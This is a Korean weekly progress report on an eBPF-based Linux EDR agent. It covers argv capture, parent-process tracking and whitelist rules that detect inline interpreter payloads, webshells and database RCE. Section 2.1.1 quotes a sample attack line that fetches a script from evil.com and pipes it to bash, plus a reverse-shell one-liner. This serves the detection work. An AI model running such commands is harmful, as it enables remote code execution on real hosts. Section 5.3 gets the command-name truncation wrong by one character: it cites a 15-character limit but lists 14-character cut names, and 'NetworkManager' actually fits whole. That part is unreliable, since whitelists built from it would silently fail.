# 주차별 진행 보고서

**프로젝트명:** 가벼운 리눅스용 EDR(Endpoint Detection & Response) 시스템  
**담당 파트:** 에이전트(Agent) 개발  
**작성일:** 2026-05-14  
**작성자:** (본인 이름)

---

## 1. 개요

1주차에 eBPF 기반 프로세스·파일·네트워크 모니터링과 기본 탐지 룰 엔진(R-001~R-009), HTTP 리포터까지 완성하였다. 2주차에는 탐지 품질을 실질적으로 높이기 위한 세 가지 고도화 작업을 수행하였다.

1. **execve argv 캡처**: `sys_enter_execve` 훅을 추가하여 실행 인자(argv)를 수집, 인라인 페이로드 탐지(R-010) 구현
2. **프로세스 트리 캐시**: 유저스페이스에서 `pid → comm` 맵을 유지하여 부모-자식 관계 기반 탐지(R-011, R-012) 구현
3. **화이트리스트/FP 억제**: 알려진 정상 프로세스·패키지 관리자를 목록화하여 주요 룰의 false-positive 비율을 대폭 감소

---

## 2. 구현 내용

### 2.1 execve argv 캡처 (R-010)

#### 2.1.1 배경 및 필요성

1주차 구현에서 `sched_process_exec` 트레이스포인트는 실행 파일 경로(`filename`)와 `comm`을 수집하지만 **실행 인자(argv)**는 수집하지 못했다. 이 때문에 다음과 같은 파일리스(fileless) 공격 패턴을 탐지할 수 없었다.

```bash
# 공격자가 자주 사용하는 인라인 페이로드 패턴
python3 -c "import os; os.system('curl http://evil.com/sh | bash')"
perl -e 'use Socket; $i="attacker"; ...'   # 리버스셸 원라이너
node -e 'require("child_process").exec(...)'
```

이 경우 `comm`은 `python3`이고 `filename`은 `/usr/bin/python3`으로 정상처럼 보이지만, `-c` 플래그가 있으면 스크립트 파일 없이 인라인 코드를 실행한다는 것을 의미한다.

#### 2.1.2 두 훅 간 데이터 전달 구조

```
sys_enter_execve                    sched_process_exec
     │                                      │
     │  argv[] 유저 포인터 읽기             │
     │  (execve 진입 시점: argv 유효)       │  (exec 성공 시점: 원본 argv 소멸)
     │                                      │
     │──── argv_store[pid] 저장 ───────────▶│
     │     (BPF_MAP_TYPE_HASH)              │
     │                                      │── 조회·복사 → process_event.argv
     │                                      │── 맵에서 삭제 (소비 후 제거)
     │                                      │── ringbuf submit
```

**왜 두 훅이 필요한가:**
- `sys_enter_execve`: argv가 아직 유저 스택에 있어 읽기 가능하지만, execve 성공 보장이 없음
- `sched_process_exec`: execve 성공이 보장되고 커널이 해석한 정확한 경로를 얻을 수 있지만, 이 시점에는 원본 유저 스택이 새 프로세스 이미지로 교체되어 argv를 읽을 수 없음

두 훅의 장점을 결합하기 위해 `argv_store (BPF_MAP_TYPE_HASH, key=PID)`를 중간 채널로 사용한다.

#### 2.1.3 BPF 루프 구현 시 검증기(verifier) 대응

BPF 검증기는 루프의 반복 횟수가 정적으로 결정되어야 분기 경로를 추적할 수 있다. `#pragma unroll`로 `MAX_ARGC=8` 회 완전 전개하여 검증기가 모든 경로를 정적 분석할 수 있게 한다.

또한 `ent->buf + off`에서 `off`의 상한을 검증기가 추적할 수 있도록 AND 마스크 기법을 적용한다.

```c
/* off & (MAX_ARGV_LEN - 1):
 * MAX_ARGV_LEN = 256 = 2^8 이므로 AND 마스크로 [0, 255] 범위를 강제.
 * 검증기가 배열 오프셋 상한을 추적할 때 이 마스크가 없으면
 * "R1 min value is negative" 등의 검증 실패 발생 가능. */
int r = bpf_probe_read_user_str(
    entry.buf + (off & (MAX_ARGV_LEN - 1)),
    MAX_ARGV_LEN - (off & (MAX_ARGV_LEN - 1)),
    arg);
```

#### 2.1.4 process_event 구조체 변경

`_pad` 필드(ts_ns 정렬용 패딩)를 `argc`로 재활용하였다. 두 필드 모두 `__u32`이므로 구조체 레이아웃이 변하지 않는다.

```c
struct process_event {
    __u32 pid;
    __u32 ppid;
    __u32 uid;
    __u32 argc;               /* 변경: _pad → argc (정렬 역할 유지) */
    __u64 ts_ns;
    char  comm[TASK_COMM_LEN];
    char  filename[MAX_FILENAME_LEN];
    char  argv[MAX_ARGV_LEN]; /* 추가: NUL 구분 argv 연결 버퍼     */
};
```

#### 2.1.5 R-010: 인터프리터 인라인 페이로드 탐지

```c
/* argv[1] == "-c" 또는 "-e": 인라인 코드 실행 플래그 */
if (comm_in(e.comm, INTERPRETERS) && e.argc >= 2) {
    const char *arg1 = get_argv_n(e.argv, 1);
    if (arg1 && (strcmp(arg1, "-c") == 0 || strcmp(arg1, "-e") == 0))
        hits.push_back({"R-010", "인터프리터 인라인 페이로드 (-c/-e 플래그)", "high"});
}
```

**탐지 출력 예시:**

```
[EXEC ]  1234.567s  PID=5678   PPID=1234  UID=0     python3          /usr/bin/python3
        argv: python3 -c import os; os.system('id')
  >>> [ALERT] R-005 | 스크립트 인터프리터 실행
  >>> [ALERT] R-008 | root 권한 인터프리터 실행
  >>> [ALERT] R-010 | 인터프리터 인라인 페이로드 (-c/-e 플래그)
```

---

### 2.2 프로세스 트리 캐시 (R-011, R-012)

#### 2.2.1 배경 및 필요성

기존 탐지 룰은 개별 이벤트만 보았기 때문에 **부모-자식 관계**를 이용한 공격 패턴을 탐지할 수 없었다. 대표적인 사례:

- **웹셸**: 공격자가 웹 애플리케이션 취약점을 통해 코드를 업로드하면 nginx/apache가 bash를 실행 → nginx → bash 체인
- **SQLi RCE**: DB 서버가 OS 명령을 실행하도록 유도 → postgres → sh 체인 (CVE-2019-9193: PostgreSQL의 `COPY TO PROGRAM`)

exec 이벤트에는 `ppid`가 포함되어 있지만 **부모의 `comm`**은 알 수 없다. 이를 해결하기 위해 유저스페이스에서 `pid → {ppid, comm}` 캐시를 유지한다.

#### 2.2.2 ProcTree 클래스 설계

```
에이전트 시작
    │
    ▼
init_from_proc()         /proc/*/status 를 순회하여
    │                    에이전트 시작 이전부터 실행 중인 프로세스를 등록
    │                    (nginx, mysqld 등 서비스 데몬 포함)
    │
    ▼ (런타임)
exec 이벤트 수신
    │
    ├─ comm_of(e.ppid) → 부모 comm 조회
    │       │
    │       ▼
    │   match_rules(e, parent_comm) → R-011/R-012 검사
    │
    └─ update(e.pid, e.ppid, e.comm) → 자신을 트리에 추가
```

**조회를 업데이트보다 먼저 수행하는 이유:** 업데이트를 먼저 하면 동일 PID가 재사용될 경우 직전 프로세스 정보를 덮어써 부모 comm 조회 결과가 오염될 수 있다.

#### 2.2.3 /proc 스캔 부트스트랩

에이전트가 시작되기 전부터 실행 중인 프로세스(nginx, mysqld 등 서비스 데몬)는 exec 이벤트가 발생하지 않으므로 트리에 자동 등록되지 않는다. 이를 해결하기 위해 `/proc/<pid>/status`를 파싱하여 초기 트리를 구성한다.

```
Name:   nginx       ← task_struct.comm (최대 15자)
Pid:    1234
PPid:   1
```

테스트 환경에서 부팅 직후 스캔 시 약 220~280개 항목이 등록되었다.

#### 2.2.4 R-011/R-012 탐지 룰

```
R-011 | 웹 서버 자식 셸 실행 (웹셸/RCE 의심) | critical
  - 부모: nginx, apache2, httpd, lighttpd, gunicorn, uwsgi, php-fpm
  - 자식: bash, sh, dash, zsh 등 셸 또는 python, perl 등 인터프리터

R-012 | DB 서버 자식 셸 실행 (SQLi RCE 의심) | critical
  - 부모: mysqld, postgres, postmaster, mongod, redis-server
  - 자식: 위와 동일
```

**웹셸 탐지 출력 예시:**

```
[EXEC ]  1234.567s  PID=4321   PPID=100   UID=33    bash             /bin/bash
        parent: nginx
        argv: bash -i
  >>> [ALERT] R-011 | 웹 서버 자식 셸 실행 (웹셸/RCE 의심)
```

---

### 2.3 화이트리스트 기반 FP 억제

#### 2.3.1 false-positive 원인 분석

1주차 구현에서 운영 환경과 유사한 조건으로 테스트했을 때 높은 FP 비율이 관찰된 룰은 다음과 같다.

| 룰 | FP 원인 |
|---|---|
| R-007 (서버 바인드) | sshd, nginx, mysqld, dockerd 등 정상 서버 프로세스가 모두 발화 |
| R-001 (시스템 경로 쓰기) | apt/dpkg 패키지 설치 시 /usr/bin, /lib 등에 파일 설치하면서 발화 |
| R-006 (비표준 포트) | curl, wget, apt 등이 비표준 포트를 사용할 경우 발화 |
| R-005/R-008 (인터프리터) | pip install, make 빌드 과정에서 python3가 호출될 때 발화 |

#### 2.3.2 화이트리스트 체계

총 4개의 화이트리스트 배열을 도입하였다.

**BIND_WHITELIST (R-007 적용)**

```c
"systemd", "systemd-resolve", "dbus-daemon",
"NetworkManage",  /* NetworkManager (15자 한도로 잘림) */
"avahi-daemon", "cupsd", "sshd",
"dockerd", "containerd", "containerd-shi",
"nginx", "apache2", "httpd", "mysqld", "postgres", ...
```

웹 서버와 DB 서버는 R-007에서는 제외하되, R-011/R-012에서 더 정교하게 탐지한다 (탐지 계층 분리).

**SYS_WRITE_WHITELIST (R-001 적용)**

```c
"dpkg", "dpkg-unpack", "dpkg-preconfig",
"apt", "apt-get", "update-alterna",  /* update-alternatives */
"rpm", "yum", "dnf", "snap", ...
```

**OUTBOUND_WHITELIST (R-006 적용)**

```c
"curl", "wget", "git", "apt", "apt-get", "snap", ...
```

**PKG_MANAGER_COMMS (R-005/R-008 부모 기반 억제)**

```c
"apt", "apt-get", "dpkg", "pip", "pip3",
"npm", "yarn", "make", "cmake", ...
```

`match_rules(e, parent_comm)` 안에서 `std::remove_if`로 hits 벡터에서 해당 룰을 제거한다.

```cpp
if (parent_comm && comm_in(parent_comm, PKG_MANAGER_COMMS)) {
    hits.erase(
        std::remove_if(hits.begin(), hits.end(),
            [](const RuleMatch &m) {
                return strcmp(m.id, "R-005") == 0 ||
                       strcmp(m.id, "R-008") == 0;
            }),
        hits.end());
}
```

#### 2.3.3 COMMON_PORTS 확장 (R-006)

기존 19개 포트에서 개발/운영 환경에서 흔히 사용하는 포트를 추가하였다.

```
추가된 포트:
  3000, 4200, 5000, 5173, 8000  (React/Vue/Flask/FastAPI 개발 서버)
  1433                           (MSSQL)
  9090, 9100                     (Prometheus, node_exporter)
  6443, 10250                    (Kubernetes API, kubelet)
  2375, 2376                     (Docker daemon)
```

---

## 3. 변경된 파일 구조

```
edr-agent/
├── include/
│   └── common.h               # process_event: _pad→argc, argv[] 필드 추가
├── bpf/
│   └── process_monitor.bpf.c  # argv_store 맵, sys_enter_execve 훅 추가
└── src/
    ├── main.cpp               # ProcTree 통합, argv/parent 터미널 출력
    ├── proc_tree.h            # ProcTree 클래스 선언 (신규)
    ├── proc_tree.cpp          # ProcTree 구현: update / comm_of / init_from_proc (신규)
    ├── rules/
    │   ├── rule_engine.h      # match_rules(e, parent_comm) 오버로드 추가
    │   └── rule_engine.cpp    # R-010~R-012, 화이트리스트 4종, COMMON_PORTS 확장
    └── output/
        └── json_fmt.cpp       # to_json: argv 배열 필드 추가
```

---

## 4. 탐지 룰 전체 목록 (2주차 기준)

| ID | 이름 | 이벤트 | 심각도 | 추가 시점 |
|---|---|---|---|---|
| R-001 | 시스템 경로 파일 수정 | FILE_WRITE | high | 1주차 |
| R-002 | 로그 파일 삭제 | FILE_DELETE | high | 1주차 |
| R-003 | `/tmp` 경로 실행 (드로퍼) | PROC_EXEC | high | 1주차 |
| R-004 | 리버스셸/스캔 도구 실행 | PROC_EXEC | critical | 1주차 |
| R-005 | 스크립트 인터프리터 실행 | PROC_EXEC | medium | 1주차 |
| R-006 | 비표준 포트 아웃바운드 | NET_CONNECT | medium | 1주차 |
| R-007 | 서버 포트 바인드 (미지 프로세스) | NET_BIND | low | 1주차 |
| R-008 | root 권한 인터프리터 실행 | PROC_EXEC | critical | 1주차 |
| R-009 | `/tmp` → 시스템 경로 rename | FILE_RENAME | critical | 1주차 |
| R-010 | 인터프리터 `-c`/`-e` 인라인 페이로드 | PROC_EXEC | high | **2주차** |
| R-011 | 웹 서버 자식 셸 실행 (웹셸) | PROC_EXEC | critical | **2주차** |
| R-012 | DB 서버 자식 셸 실행 (SQLi RCE) | PROC_EXEC | critical | **2주차** |

---

## 5. 기술적 고찰

### 5.1 BPF 훅 간 데이터 전달 패턴

`sys_enter_execve`와 `sched_process_exec`는 서로 다른 실행 시점에 발화하는 독립적인 훅이지만, 동일 태스크 컨텍스트에서 순차 실행된다. `BPF_MAP_TYPE_HASH`를 PID 키로 사용하는 중간 저장소 패턴은 execsnoop, opensnoop 등 다수의 BPF 관측 도구에서도 채택하는 표준 기법이다.

실패한 `execve()`에서는 `sched_process_exec`가 발화하지 않으므로 `argv_store` 항목이 삭제되지 않는다. 이 경우 동일 PID의 다음 `execve()` 시도가 항목을 덮어쓰므로 메모리 누수 없이 자연 정리된다.

### 5.2 유저스페이스 프로세스 트리 vs BPF 측 트리

프로세스 트리를 BPF 커널 측에서 유지하려면 `sched_process_fork`(생성)와 `sched_process_exit`(소멸) 두 훅을 추가로 구현해야 하며, BPF 맵 업데이트 경쟁 조건 처리와 메모리 사용량 제어가 복잡해진다. 반면 유저스페이스에서 `std::unordered_map`으로 관리하면 구현이 단순하고 `/proc` 스캔으로 부트스트랩이 가능하다. EDR 에이전트처럼 이벤트 레이턴시보다 정확성이 중요한 시나리오에서는 유저스페이스 트리가 실용적인 선택이다.

### 5.3 task_struct.comm 15자 제한과 화이트리스트 정확도

리눅스 커널의 `task_struct.comm` 필드는 최대 15자(+ NUL)로 제한된다. 따라서 긴 프로세스 이름은 잘려서 기록된다.

```
NetworkManager  → "NetworkManage"  (14+1)
update-alternatives → "update-alterna" (14+1)
dpkg-preconfigure   → "dpkg-preconfig" (14+1)
```

화이트리스트 배열에서는 이 잘린 이름을 사용해야 한다. 잘못된 이름을 사용하면 화이트리스트가 적용되지 않아 FP가 지속된다.

---

## 6. 다음 주 계획

| 항목 | 내용 |
|---|---|
| 백엔드 API 스펙 협의 | NDJSON 스키마 확정, 수신 서버 엔드포인트 구조 논의 |
| sched_process_exit 훅 | 프로세스 종료 이벤트 추가, ProcTree 정리 연동 |
| 2주차 코드 리뷰 | 팀원 간 BPF 코드 설명 및 인터페이스 확정 |

---

*소스코드: https://github.com/no-carve-only-pizza/edr-agent*
